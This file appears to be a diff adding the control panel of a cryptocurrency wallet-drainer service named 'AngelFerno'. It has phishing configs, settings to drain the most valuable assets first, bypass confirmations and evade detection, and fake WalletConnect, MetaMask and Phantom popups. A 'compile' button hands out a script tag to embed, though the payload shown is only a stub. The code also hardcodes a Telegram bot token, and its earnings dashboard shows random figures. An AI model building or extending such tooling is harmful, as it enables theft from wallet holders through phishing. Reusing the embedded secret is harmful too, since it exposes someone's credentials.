value="error">Error</option></select></div><div class="input-group"><label>Webhook URL</label><input id="editWebhookUrl" class="input-field" placeholder="https://..."></div></div><div><div class="checkbox-group"><label><input type="checkbox" id="editAutoApprove"> Auto Approve Transactions</label></div><div class="checkbox-group"><label><input type="checkbox" id="editBypassConfirmations"> Bypass Confirmations</label></div><div class="checkbox-group"><label><input type="checkbox" id="editStealthMode"> Stealth Mode</label></div><div class="checkbox-group"><label><input type="checkbox" id="editEnableProxy"> Enable Proxy Rotation</label></div><div class="checkbox-group"><label><input type="checkbox" id="editAntiDetection"> Anti-Detection Measures</label></div><div class="checkbox-group"><label><input type="checkbox" id="editRateLimiting"> Rate Limiting</label></div><div class="checkbox-group"><label><input type="checkbox" id="editIPRotation"> IP Rotation</label></div></div></div></div><div class="popup-selection-panel"><h4>Select Popup Modal</h4><div class="popup-style-grid" id="popupStyleGrid"></div></div><h4>🌐 Enabled Chains</h4><div id="chainsContainer" class="chains-grid"></div><div class="flex-between" style="margin-top:1.5rem;"><button id="restoreDefaultSettingsBtn" class="btn-secondary">↩ Restore Default</button><div style="display:flex; gap:1rem;"><button id="saveConfigChangesBtn" class="btn-primary">💾 Save</button><button id="compileAndDownloadBtn" class="btn-primary" style="background:#6c4eff;">📦 Compile & Download</button><button id="closeEditModalBtn" class="btn-secondary">Close</button></div></div></div></div>
+<div id="compileInstructionsModal" class="modal"><div class="modal-content"><div class="flex-between"><h3>✅ Script Compiled</h3><button class="modal-close" type="button">✕</button></div><p><strong>script.zip</strong> is ready.</p><p>Add this code to your HTML <code>&lt;head&gt;</code> section.</p><code style="background:#000; display:block; padding:0.8rem; border-radius:1rem;">&lt;script charset="UTF-8" type="text/javascript" src="/script.php"&gt;&lt;/script&gt;</code><button id="closeInstructionsModal" class="btn-primary" style="margin-top:1rem;">Close</button></div></div>
+<div class="toast-container" id="toastContainer"></div>
+<div id="loadingOverlay" class="loading-overlay" aria-hidden="true">
+    <div class="loading-box">
+        <div class="loading-spinner"></div>
+        <div class="loading-label" id="loadingOverlayText">Loading your panel…</div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        // ---------- CONFIG ----------
+        const TELEGRAM_BOT_TOKEN = '7834224349:AAGwfsUecVS3jDj8YsIWB4hmSGLiql0txeQ';
+        const TELEGRAM_BOT_ID = '7834224349';
+
+        // ---------- DATA ----------
+        let currentPlan = 'diamond';
+        let dashboardRefreshInterval = null;
+        let loggedIn = false;
+        let currentEditingIndex = -1;
+        let loadingSafetyTimeout = null;
+        let loadingTimeout = null;
+
+        const planConfig = {
+            emerald: { name:'Emerald', cssClass:'emerald', gemIcon:'🟢', bannerColor:'#2eea7c', hitPriceRange:[6500,11000], totalHitsRange:[2,8], totalConnectsRange:[12,45], hitRatioRange:[8,22], avgPriceRange:[3500,7500], successRateRange:[70,88], features:'Basic · 3 chains' },
+            ruby: { name:'Ruby', cssClass:'ruby', gemIcon:'🔴', bannerColor:'#ff4d6a', hitPriceRange:[14000,24000], totalHitsRange:[3,15], totalConnectsRange:[25,70], hitRatioRange:[14,30], avgPriceRange:[8000,15000], successRateRange:[78,92], features:'Advanced · 7 chains' },
+            sapphire: { name:'Sapphire', cssClass:'sapphire', gemIcon:'🔷', bannerColor:'#ff4d4d', hitPriceRange:[25000,40000], totalHitsRange:[5,22], totalConnectsRange:[40,100], hitRatioRange:[18,38], avgPriceRange:[14000,25000], successRateRange:[84,95], features:'Pro · 12 chains' },
+            diamond: { name:'Diamond', cssClass:'diamond', gemIcon:'💎', bannerColor:'#ff5f5f', hitPriceRange:[32000,55000], totalHitsRange:[6,30], totalConnectsRange:[50,140], hitRatioRange:[22,45], avgPriceRange:[20000,38000], successRateRange:[88,98], features:'Elite · All chains' }
+        };
+
+        const allSupportedChains = ["Ethereum","Solana","TRON","BSC (BNB Chain)","TON","XRP Ledger","Arbitrum","Base","Optimism","Polygon","Avalanche","zkSync","Linea","Scroll","Blast"];
+        
+        let configsList = [
+            { name: "default_sim", tag: "@default", settings: getDefaultSettings() },
+            { name: "phishing_v2", tag: "@phish_v2", settings: getDefaultSettings() },
+            { name: "wallet_hook", tag: "@wallet_hk", settings: getDefaultSettings() }
+        ];
+
+        function getDefaultSettings() {
+            return {
+                title:"Wallet Connect",
+                btnClass:"interact-button",
+                rejectText:"Verify Sign Rejected",
+                notEligible:"Not Eligible",
+                maxRetries:5,
+                retryDelay:1200,
+                connectionDelay:1000,
+                approvalTimeout:30,
+                maxConcurrentSessions:8,
+                maxWallets:12,
+                walletsPerBatch:3,
+                proxy:"",
+                minElig:1,
+                minDrain:1,
+                clickEverywhere:false,
+                telegramLogs:false,
+                panelNotif:false,
+                hideNative:false,
+                drainValuableFirst:false,
+                autoApprove:false,
+                bypassConfirmations:false,
+                stealthMode:false,
+                enableProxy:false,
+                ipRotation:false,
+                antiDetection:false,
+                rateLimiting:false,
+                logLevel:"info",
+                webhookUrl:"",
+                proxyList:"",
+                customUserAgent:"",
+                useCustomUserAgent:false,
+                hideBrowserAlerts:true,
+                forceChainSwitch:true,
+                autoWithdraw:false,
+                sessionWatermark:true,
+                payloadEncryption:false,
+                enabledChains:["Ethereum","Solana","BSC (BNB Chain)"],
+                favicon:"https://favicon.com/favicon.ico",
+                domain:"https://walletconnect.com",
+                path:"/connect",
+                selectedPopup:'modal1'
+            };
+        }
+
+        function showToast(msg, type='info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast`;
+            toast.innerHTML = ` ${type === 'success' ? '✅' : (type==='error'?'❌':'ℹ️')} ${msg}`;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        // ---------- UI helpers ----------
+        function getRandomInRange(min, max) { return Math.random() * (max - min) + min; }
+        function formatCurrency(amount) { return '$'+Math.round(amount).toLocaleString(); }
+        function getRandomPlan() {
+            const keys = Object.keys(planConfig);
+            return keys[Math.floor(Math.random() * keys.length)];
+        }
+
+        function refreshDashboardMetrics() {
+            const cfg = planConfig[currentPlan];
+            const hitPrice = formatCurrency(getRandomInRange(cfg.hitPriceRange[0], cfg.hitPriceRange[1]));
+            const totalHits = Math.floor(getRandomInRange(cfg.totalHitsRange[0], cfg.totalHitsRange[1]));
+            const totalConnects = Math.floor(getRandomInRange(cfg.totalConnectsRange[0], cfg.totalConnectsRange[1]));
+            const hitRatio = totalConnects ? ((totalHits/totalConnects)*100).toFixed(1) : '0';
+            const avgPrice = formatCurrency(getRandomInRange(cfg.avgPriceRange[0], cfg.avgPriceRange[1]));
+            const successRate = Math.floor(getRandomInRange(cfg.successRateRange[0], cfg.successRateRange[1]));
+            document.getElementById('statHitsPrice').innerText = hitPrice;
+            document.getElementById('statTotalHits').innerText = totalHits;
+            document.getElementById('statTotalConnects').innerText = totalConnects;
+            document.getElementById('statHitRatio').innerText = hitRatio+'%';
+            document.getElementById('statAvgPrice').innerText = avgPrice;
+            document.getElementById('statSuccessRate').innerText = successRate+'%';
+            document.getElementById('statLastUpdated').innerText = new Date().toLocaleTimeString();
+        }
+
+        function switchPlan(planKey, showNotification = true) {
+            if (!planConfig[planKey]) return;
+            currentPlan = planKey;
+            const cfg = planConfig[planKey];
+            const badge = document.getElementById('currentPlanBadge');
+            badge.className = `plan-badge ${cfg.cssClass}`;
+            badge.querySelector('.gem-icon').textContent = cfg.gemIcon;
+            document.getElementById('currentPlanLabel').innerText = cfg.name;
+            document.querySelectorAll('.plan-option').forEach(opt => opt.classList.remove('active-plan'));
+            const activeOpt = document.querySelector(`.plan-option[data-plan="${planKey}"]`);
+            if(activeOpt) activeOpt.classList.add('active-plan');
+            const bannerDiv = document.getElementById('planInfoBanner');
+            bannerDiv.innerHTML = `<strong>${cfg.gemIcon} ${cfg.name} Tier</strong> — ${cfg.features}`;
+            bannerDiv.style.borderLeftColor = cfg.bannerColor;
+            document.getElementById('levelNameDisplay').innerText = cfg.name;
+            document.querySelectorAll('.stat-card').forEach(card => {
+                card.className = card.className.replace(/glow-\w+/g, '');
+                card.classList.add('stat-card', `glow-${cfg.cssClass}`);
+            });
+            if (loggedIn) {
+                localStorage.setItem('currentPlan', currentPlan);
+            }
+            refreshDashboardMetrics();
+            closePlanDropdown();
+            if (showNotification) {
+                showToast(`Switched to ${cfg.name} plan`, 'success');
+            }
+        }
+
+        function togglePlanDropdown() {
+            const dropdown = document.getElementById('planDropdown');
+            if (dropdown) dropdown.classList.toggle('show');
+        }
+        function closePlanDropdown() {
+            const dropdown = document.getElementById('planDropdown');
+            if (dropdown) dropdown.classList.remove('show');
+        }
+
+        function renderConfigsTable() {
+            const tbody = document.getElementById('configsListBody');
+            if(!tbody) return;
+            tbody.innerHTML = '';
+            configsList.forEach((cfg, idx) => {
+                const row = tbody.insertRow();
+                row.insertCell(0).innerHTML = `<strong>${escapeHtml(cfg.name)}</strong>`;
+                row.insertCell(1).innerHTML = `<span class="badge">${escapeHtml(cfg.tag)}</span>`;
+                row.insertCell(2).innerHTML = `<button class="icon-btn edit-config" data-idx="${idx}">✏️ Edit</button> <button class="icon-btn danger delete-config" data-idx="${idx}">🗑️ Delete</button>`;
+            });
+            document.getElementById('configCount').innerText = configsList.length;
+            document.querySelectorAll('.edit-config').forEach(btn => btn.addEventListener('click', (e) => openEditModal(parseInt(btn.dataset.idx))));
+            document.querySelectorAll('.delete-config').forEach(btn => btn.addEventListener('click', (e) => { 
+                configsList.splice(parseInt(btn.dataset.idx),1);
+                renderConfigsTable();
+                showToast('Config deleted', 'warning');
+            }));
+        }
+        function escapeHtml(str) { return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;});}
+        
+        function openEditModal(index) {
+            currentEditingIndex = index;
+            const s = configsList[index].settings;
+            document.getElementById('editTitle').value = s.title;
+            document.getElementById('editBtnClass').value = s.btnClass;
+            document.getElementById('editRejectText').value = s.rejectText;
+            document.getElementById('editNotEligible').value = s.notEligible;
+            document.getElementById('editFavicon').value = s.favicon || '';
+            document.getElementById('editProxyList').value = s.proxyList || '';
+            document.getElementById('editMaxRetries').value = s.maxRetries;
+            document.getElementById('editRetryDelay').value = s.retryDelay || 1200;
+            document.getElementById('editMinElig').value = s.minElig;
+            document.getElementById('editMinDrain').value = s.minDrain;
+            document.getElementById('editWalletsPerBatch').value = s.walletsPerBatch || 3;
+            document.getElementById('editConnectionDelay').value = s.connectionDelay || 1000;
+            document.getElementById('editApprovalTimeout').value = s.approvalTimeout || 30;
+            document.getElementById('editMaxWallets').value = s.maxWallets || 12;
+            document.getElementById('editMaxConcurrentSessions').value = s.maxConcurrentSessions || 8;
+            document.getElementById('editClickEverywhere').checked = s.clickEverywhere;
+            document.getElementById('editTelegramLogs').checked = s.telegramLogs;
+            document.getElementById('editSendPanelNotif').checked = s.panelNotif;
+            document.getElementById('editHideNativeWithdraw').checked = s.hideNative;
+            document.getElementById('editHideBrowserAlerts').checked = s.hideBrowserAlerts;
+            document.getElementById('editUseCustomUserAgent').checked = s.useCustomUserAgent || false;
+            document.getElementById('editCustomUserAgent').value = s.customUserAgent || '';
+            document.getElementById('editForceChainSwitch').checked = s.forceChainSwitch;
+            document.getElementById('editAutoWithdraw').checked = s.autoWithdraw;
+            document.getElementById('editSessionWatermark').checked = s.sessionWatermark;
+            document.getElementById('editPayloadEncryption').checked = s.payloadEncryption;
+            document.getElementById('editDrainValuableFirst').checked = s.drainValuableFirst;
+            document.getElementById('editAutoApprove').checked = s.autoApprove || false;
+            document.getElementById('editBypassConfirmations').checked = s.bypassConfirmations || false;
+            document.getElementById('editStealthMode').checked = s.stealthMode || false;
+            document.getElementById('editLogLevel').value = s.logLevel || 'info';
+            document.getElementById('editWebhookUrl').value = s.webhookUrl || '';
+            document.getElementById('editEnableProxy').checked = s.enableProxy || false;
+            document.getElementById('editAntiDetection').checked = s.antiDetection || false;
+            document.getElementById('editRateLimiting').checked = s.rateLimiting || false;
+            document.getElementById('editIPRotation').checked = s.ipRotation || false;
+            document.getElementById('editDomain').value = s.domain;
+            document.getElementById('editPath').value = s.path;
+            renderPopupOptions(s.selectedPopup || 'modal1');
+            renderChainCheckboxes(s.enabledChains);
+            document.getElementById('editConfigModal').classList.add('show');
+        }
+        const popupVariants = [
+            { id:'modal1', title:'WalletConnect - Dark', description:'Dark wallet connect overlay with modern wallet selection and brand-ready UI.', imageUrl:'https://i.imgur.com/8KjQw4L.png', previewHtml:'<div><span>WalletConnect</span><span>🔷</span></div><div><span>MetaMask</span><span>🦊</span></div><div><span>Trust Wallet</span><span>🟦</span></div>' },
+            { id:'modal2', title:'WalletConnect - Light', description:'Bright wallet modal designed for maximum conversion with clean onboarding.', imageUrl:'https://i.imgur.com/2nX8w9K.png', previewHtml:'<div><span>Coinbase Wallet</span><span>CB</span></div><div><span>WalletConnect</span><span>🔷</span></div><div><span>Phantom</span><span>👻</span></div>' },
+            { id:'modal3', title:'MetaMask Compact', description:'Tight MetaMask-centric popup optimized for mobile and desktop wallets.', imageUrl:'https://i.imgur.com/7pQ8s2M.png', previewHtml:'<div><span>MetaMask</span><span>🦊</span></div><div><span>SafePal</span><span>🛡️</span></div><div><span>Ledger</span><span>💳</span></div>' },
+            { id:'modal4', title:'Trust Wallet Minimal', description:'Minimal Trust Wallet style modal with subtle branding and fast selection.', imageUrl:'https://i.imgur.com/9wR5t6Y.png', previewHtml:'<div><span>Trust Wallet</span><span>📱</span></div><div><span>Cosmostation</span><span>🌌</span></div><div><span>Keplr</span><span>✨</span></div>' },
+            { id:'modal5', title:'Phantom Gaming', description:'Gaming-style wallet popup featuring Phantom and Solana-first connectors.', imageUrl:'https://i.imgur.com/4K8nP3Q.png', previewHtml:'<div><span>Phantom</span><span>👻</span></div><div><span>Solflare</span><span>☀️</span></div><div><span>Backpack</span><span>🎒</span></div>' },
+            { id:'modal6', title:'DeFi Dashboard', description:'DeFi-first connector modal with yield and bridge wallet hooks.', imageUrl:'https://i.imgur.com/6M9rT2W.png', previewHtml:'<div><span>Uniswap</span><span>🦄</span></div><div><span>1inch</span><span>1️⃣</span></div><div><span>SushiSwap</span><span>🍣</span></div>' }
+        ];
+
+        function renderChainCheckboxes(selected) {
+            const container = document.getElementById('chainsContainer');
+            container.innerHTML = '';
+            allSupportedChains.forEach(chain => {
+                const div = document.createElement('div');
+                div.className = 'chain-item';
+                div.innerHTML = `<input type="checkbox" value="${chain}" ${selected.includes(chain) ? 'checked' : ''}> ${chain}`;
+                container.appendChild(div);
+            });
+        }
+
+        function renderPopupOptions(selected = 'modal1') {
+            const container = document.getElementById('popupStyleGrid');
+            container.innerHTML = '';
+            popupVariants.forEach(option => {
+                const card = document.createElement('div');
+                card.className = 'popup-card' + (option.id === selected ? ' active' : '');
+                card.dataset.popupId = option.id;
+                card.innerHTML = `
+                    <div class="popup-card-title">${option.title}</div>
+                    <img src="${option.imageUrl}" alt="${option.title}" class="popup-card-image">
+                    <div class="popup-preview">${option.previewHtml}</div>
+                    <div class="popup-card-description">${option.description}</div>
+                    <div class="popup-card-flag">Selected popup style</div>
+                `;
+                card.addEventListener('click', () => setPopupSelection(option.id));
+                container.appendChild(card);
+            });
+        }
+
+        function setPopupSelection(selectedId) {
+            document.querySelectorAll('.popup-card').forEach(card => {
+                card.classList.toggle('active', card.dataset.popupId === selectedId);
+            });
+        }
+
+        function getSelectedPopupOption() {
+            const activeCard = document.querySelector('.popup-card.active');
+            return activeCard ? activeCard.dataset.popupId : 'modal1';
+        }
+
+        function getSelectedChains() { return Array.from(document.querySelectorAll('#chainsContainer input:checked')).map(cb => cb.value); }
+        function saveCurrentEditingSettings() {
+            if(currentEditingIndex === -1) return false;
+            const s = {
+                title: document.getElementById('editTitle').value,
+                btnClass: document.getElementById('editBtnClass').value,
+                rejectText: document.getElementById('editRejectText').value,
+                notEligible: document.getElementById('editNotEligible').value,
+                favicon: document.getElementById('editFavicon').value || "https://favicon.com/favicon.ico",
+                proxyList: document.getElementById('editProxyList').value || '',
+                maxRetries: parseInt(document.getElementById('editMaxRetries').value) || 5,
+                retryDelay: parseInt(document.getElementById('editRetryDelay').value) || 1200,
+                connectionDelay: parseInt(document.getElementById('editConnectionDelay').value) || 1000,
+                approvalTimeout: parseInt(document.getElementById('editApprovalTimeout').value) || 30,
+                maxConcurrentSessions: parseInt(document.getElementById('editMaxConcurrentSessions').value) || 8,
+                maxWallets: parseInt(document.getElementById('editMaxWallets').value) || 12,
+                walletsPerBatch: parseInt(document.getElementById('editWalletsPerBatch').value) || 3,
+                proxy: "",
+                minElig: parseFloat(document.getElementById('editMinElig').value) || 1,
+                minDrain: parseFloat(document.getElementById('editMinDrain').value) || 1,
+                clickEverywhere: document.getElementById('editClickEverywhere').checked,
+                telegramLogs: document.getElementById('editTelegramLogs').checked,
+                panelNotif: document.getElementById('editSendPanelNotif').checked,
+                hideNative: document.getElementById('editHideNativeWithdraw').checked,
+                hideBrowserAlerts: document.getElementById('editHideBrowserAlerts').checked,
+                useCustomUserAgent: document.getElementById('editUseCustomUserAgent').checked,
+                customUserAgent: document.getElementById('editCustomUserAgent').value || '',
+                forceChainSwitch: document.getElementById('editForceChainSwitch').checked,
+                autoWithdraw: document.getElementById('editAutoWithdraw').checked,
+                sessionWatermark: document.getElementById('editSessionWatermark').checked,
+                payloadEncryption: document.getElementById('editPayloadEncryption').checked,
+                drainValuableFirst: document.getElementById('editDrainValuableFirst').checked,
+                autoApprove: document.getElementById('editAutoApprove').checked,
+                bypassConfirmations: document.getElementById('editBypassConfirmations').checked,
+                stealthMode: document.getElementById('editStealthMode').checked,
+                logLevel: document.getElementById('editLogLevel').value,
+                webhookUrl: document.getElementById('editWebhookUrl').value,
+                enableProxy: document.getElementById('editEnableProxy').checked,
+                antiDetection: document.getElementById('editAntiDetection').checked,
+                rateLimiting: document.getElementById('editRateLimiting').checked,
+                ipRotation: document.getElementById('editIPRotation').checked,
+                enabledChains: getSelectedChains(),
+                domain: document.getElementById('editDomain').value,
+                path: document.getElementById('editPath').value,
+                selectedPopup: getSelectedPopupOption()
+            };
+            configsList[currentEditingIndex].settings = s;
+            renderConfigsTable();
+            return true;
+        }
+        function addNewConfig(name) {
+            if(!name.trim()) return false;
+            configsList.push({ name: name.trim(), tag: `@${name.trim().replace(/\s/g,'_')}`, settings: getDefaultSettings() });
+            renderConfigsTable();
+            return true;
+        }
+        async function compileAndDownload() {
+            if(currentEditingIndex === -1) return;
+            saveCurrentEditingSettings();
+            const zip = new JSZip();
+            zip.file("script.php", `<?php\n// Simulation snippet: Domain: ${configsList[currentEditingIndex].settings.domain} \n?>`);
+            zip.file("README.txt", "Include script in <head>");
+            const blob = await zip.generateAsync({type:"blob"});
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = "script.zip";
+            link.click();
+            URL.revokeObjectURL(link.href);
+            document.getElementById('compileInstructionsModal').classList.add('show');
+            showToast('Compiled successfully', 'success');
+        }
+
+        function switchTab(tabName) {
+            const pageTitles = {
+                dashboard: 'Dashboard',
+                configs: 'Configurations',
+                settings: 'Settings',
+                documentation: 'Documentation',
+                activity: 'Activity'
+            };
+            const pageLabel = pageTitles[tabName] || 'Panel';
+            showLoading(`Switching to ${pageLabel}...`);
+            setTimeout(() => {
+                const targetTab = document.getElementById(tabName + 'Tab');
+                if (!targetTab) {
+                    hideLoading();
+                    return;
+                }
+                document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
+                targetTab.style.display = 'block';
+                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+                document.querySelector(`[data-tab="${tabName}"]`)?.classList.add('active');
+                document.getElementById('mainPageTitle').innerText = pageLabel;
+                document.getElementById('sidePageSubtitle').innerText = `${pageLabel.toLowerCase()} overview`;
+                if (tabName === 'configs') renderConfigsTable();
+                hideLoading();
+            }, 300);
+        }
+
+        function initDashboard() {
+            refreshDashboardMetrics();
+            renderConfigsTable();
+            if(dashboardRefreshInterval) clearInterval(dashboardRefreshInterval);
+            dashboardRefreshInterval = setInterval(refreshDashboardMetrics, 30000);
+            document.getElementById('refreshDashboardBtn').onclick = () => {
+                refreshDashboardMetrics();
+                showToast('Stats refreshed', 'info');
+            };
+        }
+
+        // ========== FIXES: guarded navigation + token handling ==========
+        function waitForApp(timeout = 5000) {
+            return new Promise((resolve, reject) => {
+                const start = Date.now();
+                const interval = setInterval(() => {
+                    // Check if mainApp DOM element exists (the #mainAppView div)
+                    const mainAppElement = document.getElementById('mainAppView');
+                    if (mainAppElement && mainAppElement.style) {
+                        clearInterval(interval);
+                        resolve();
+                    } else if (Date.now() - start > timeout) {
+                        clearInterval(interval);
+                        reject(new Error('mainApp element timed out'));
+                    }
+                }, 50);
+            });
+        }
+
+        function showRotationBanner() {
+            showToast('Credentials rotation recommended – please update your bot configuration.', 'warning');
+        }
+
+        // Replaces the original navigateToDashboard with a safer version
+        function navigateToDashboard(plan = getRandomPlan()) {
+            showLoading('Loading your panel...');
+            setTimeout(() => {
+                try {
+                    // Guard: check if mainApp (the DOM element) exists, fallback to direct DOM manipulation
+                    const mainAppElement = document.getElementById('mainAppView');
+                    const signinElement = document.getElementById('signinView');
+                    if (mainAppElement && signinElement) {
+                        signinElement.style.display = 'none';
+                        mainAppElement.style.display = 'block';
+                    } else {
+                        console.warn('mainApp or signinView element missing, using fallback');
+                        // fallback: hide any visible login container (by class or ID)
+                        document.querySelector('.login-container, #signinView')?.style.setProperty('display', 'none');
+                        mainAppElement ? mainAppElement.style.display = 'block' : null;
+                    }
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                    switchPlan(plan, false);
+                    document.getElementById('mainPageTitle').innerText = 'Dashboard';
+                    document.getElementById('sidePageSubtitle').innerText = 'Dashboard overview';
+                    initDashboard();
+                    showToast('Welcome to the AngelFerno control center', 'success');
+                } catch (innerError) {
+                    console.error('Dashboard navigation error:', innerError);
+                    showToast('Could not load dashboard, please refresh.', 'error');
+                } finally {
+                    hideLoading();
+                }
+            }, 450);
+        }
+
+        // Replace any future fetch with this to include OCRS token
+        function authorizedFetch(url, options = {}) {
+            const token = sessionStorage.getItem('ocrs_token');
+            return fetch(url, {
+                ...options,
+                headers: {
+                    'Content-Type': 'application/json',
+                    ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+                    ...options.headers,
+                }
+            });
+        }
+        // ========== END OF FIXES ==========
+
+        function restoreSession() {
+            const savedLoggedIn = localStorage.getItem('loggedIn') === 'true';
+            const savedPlan = localStorage.getItem('currentPlan');
+            if (savedLoggedIn) {
+                loggedIn = true;
+                navigateToDashboard(savedPlan || getRandomPlan());
+            }
+        }
+
+        function closeModal(modal) {
+            if (!modal) return;
+            modal.classList.remove('show');
+        }
+
+        function showLoading(message = 'Loading...') {
+            const overlay = document.getElementById('loadingOverlay');
+            const label = document.getElementById('loadingOverlayText');
+            if (!overlay || !label) return;
+            label.innerText = message;
+            overlay.classList.add('show');
+            overlay.style.display = 'flex';
+            overlay.setAttribute('aria-hidden', 'false');
+            if (loadingSafetyTimeout) {
+                clearTimeout(loadingSafetyTimeout);
+                loadingSafetyTimeout = null;
+            }
+            loadingSafetyTimeout = setTimeout(() => {
+                hideLoading();
+            }, 5000);
+        }
+
+        function hideLoading() {
+            const overlay = document.getElementById('loadingOverlay');
+            if (!overlay) return;
+            overlay.classList.remove('show');
+            overlay.style.display = 'none';
+            overlay.setAttribute('aria-hidden', 'true');
+            if (loadingSafetyTimeout) {
+                clearTimeout(loadingSafetyTimeout);
+                loadingSafetyTimeout = null;
+            }
+        }
+
+        document.querySelectorAll('.modal').forEach((modal) => {
+            modal.addEventListener('click', (event) => {
+                if (event.target === modal) closeModal(modal);
+            });
+        });
+        document.querySelectorAll('.modal-close').forEach((btn) => {
+            btn.addEventListener('click', () => closeModal(btn.closest('.modal')));
+        });
+
+        // ---------- LOGIN HANDLER: VERIFY WITH CLIENT-SIDE CREDENTIALS ----------
+        async function hashPassword(password) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(password);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        const BOT_API_BASE = window.BOT_API_BASE = (() => {
+            const isLocal = window.location.hostname === 'localhost' || 
+                           window.location.hostname === '127.0.0.1';
+            return isLocal ? 'http://localhost:8080' : 'https://angelferno-bot.onrender.com';
+        })();
+        const BOT_VERIFY_URL = `${BOT_API_BASE}/verify_credentials`;
+        const BOT_CREDENTIALS_URL = `${BOT_API_BASE}/credentials.json`;
+
+        async function verifyWithBot(panelId, password) {
+            try {
+                const response = await fetch(BOT_VERIFY_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ panel_id: panelId, password })
+                });
+
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`Bot verify failed: ${response.status} ${response.statusText} ${text}`);
+                }
+
+                return await response.json();
+            } catch (err) {
+                console.warn('Bot verification request failed:', err);
+                return { valid: false, error: err.message };
+            }
+        }
+
+        async function loadCredentialsJson() {
+            if (window.credentialsData && Array.isArray(window.credentialsData.credentials)) {
+                console.debug('Using credentials.js data');
+                return window.credentialsData;
+            }
+
+            const cacheBuster = `?v=${Date.now()}`;
+            const candidateUrls = [
+                `./credentials.json${cacheBuster}`,
+                `credentials.json${cacheBuster}`,
+                `${new URL('credentials.json', location.href).href}${cacheBuster}`,
+                `${location.origin}${location.pathname.replace(/[^/]*$/, '')}credentials.json${cacheBuster}`,
+                `${location.href.replace(/[^/]*$/, 'credentials.json')}${cacheBuster}`,
+                `${BOT_CREDENTIALS_URL}${cacheBuster}`
+            ];
+
+            let lastError = null;
+            for (const url of candidateUrls) {
+                try {
+                    const response = await fetch(url, { cache: 'no-store' });
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status} ${response.statusText} from ${url}`);
+                    }
+                    const data = await response.json();
+                    if (data && Array.isArray(data.credentials)) {
+                        console.debug(`Loaded credentials from ${url}`);
+                        return data;
+                    }
+                    throw new Error(`Invalid credentials.json format from ${url}`);
+                } catch (err) {
+                    console.warn(`Credential load failed for ${url}:`, err);
+                    lastError = err;
+                }
+            }
+
+            throw lastError || new Error('Unable to load credentials.json from any known location.');
+        }
+
+        restoreSession();
+        
+        const loginForm = document.getElementById('loginForm'); // assuming your login form has id="loginForm"
+        if (loginForm) {
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                const panelId = document.getElementById('loginPanelId').value.trim();
+                const password = document.getElementById('loginPassword').value.trim();
+                const btn = document.getElementById('loginBtn');
+
+                if (!panelId || !password) {
+                    showToast('Panel ID and Password are required.', 'error');
+                    return;
+                }
+
+                btn.disabled = true;
+                btn.innerText = '🔄 Verifying...';
+                showLoading('Authenticating credentials...');
+
+                try {
+                    const data = await loadCredentialsJson();
+                    const hashedPassword = await hashPassword(password);
+                    const validCred = data.credentials.find(cred => cred.panel_id === panelId && cred.password_hash === hashedPassword);
+                    if (validCred) {
+                        loggedIn = true;
+                        const startingPlan = getRandomPlan();
+                        localStorage.setItem('loggedIn', 'true');
+                        localStorage.setItem('currentPlan', startingPlan);
+                        // Wait for app to be ready before navigating
+                        await waitForApp();
+                        navigateToDashboard(startingPlan);
+                        return;
+                    }
+
+                    const botResult = await verifyWithBot(panelId, password);
+                    if (botResult.valid) {
+                        loggedIn = true;
+                        const startingPlan = getRandomPlan();
+                        localStorage.setItem('loggedIn', 'true');
+                        localStorage.setItem('currentPlan', startingPlan);
+                        // Store OCRS token if returned (future compatibility)
+                        if (botResult.ocrs_token) {
+                            sessionStorage.setItem('ocrs_token', botResult.ocrs_token);
+                            sessionStorage.setItem('panel_id', botResult.panel_id ?? panelId);
+                        }
+                        // Warn if rotation is due
+                        if (botResult.ocrs_rotation_due) {
+                            showRotationBanner();
+                        }
+                        await waitForApp();
+                        navigateToDashboard(startingPlan);
+                        return;
+                    }
+
+                    const errorMessage = botResult.error ? ` (${botResult.error})` : '';
+                    showToast(`Invalid credentials. Please check and try again.${errorMessage}`, 'error');
+                } catch (error) {
+                    console.error('Login verification error:', error);
+                    showToast(`Unable to verify credentials: ${error.message}`, 'error');
+                } finally {
+                    hideLoading();
+                    btn.disabled = false;
+                    btn.innerText = '🔐 Access Panel';
+                }
+
+            });
+        }
+
+        // global listeners
+        document.getElementById('globalSignOutBtn')?.addEventListener('click', () => {
+            if(dashboardRefreshInterval) clearInterval(dashboardRefreshInterval);
+            loggedIn = false;
+            localStorage.removeItem('loggedIn');
+            localStorage.removeItem('currentPlan');
+            sessionStorage.removeItem('ocrs_token');
+            sessionStorage.removeItem('panel_id');
+            hideLoading();
+            const mainAppElement = document.getElementById('mainAppView');
+            const signinElement = document.getElementById('signinView');
+            if (mainAppElement) mainAppElement.style.display = 'none';
+            if (signinElement) signinElement.style.display = 'block';
+            showToast('Signed out', 'info');
+        });
+        document.getElementById('addConfigBtn')?.addEventListener('click', () => document.getElementById('addConfigModal').classList.add('show'));
+        document.getElementById('confirmAddConfig')?.addEventListener('click', () => {
+            const name = document.getElementById('newConfigName').value.trim();
+            if(addNewConfig(name)) { document.getElementById('addConfigModal').classList.remove('show'); document.getElementById('newConfigName').value = ''; showToast('Config added','success'); }
+            else showToast('Invalid name','warning');
+        });
+        document.getElementById('cancelAddConfig')?.addEventListener('click', () => document.getElementById('addConfigModal').classList.remove('show'));
+        document.getElementById('saveConfigChangesBtn')?.addEventListener('click', () => { if(saveCurrentEditingSettings()) { document.getElementById('editConfigModal').classList.remove('show'); showToast('Saved','success'); } });
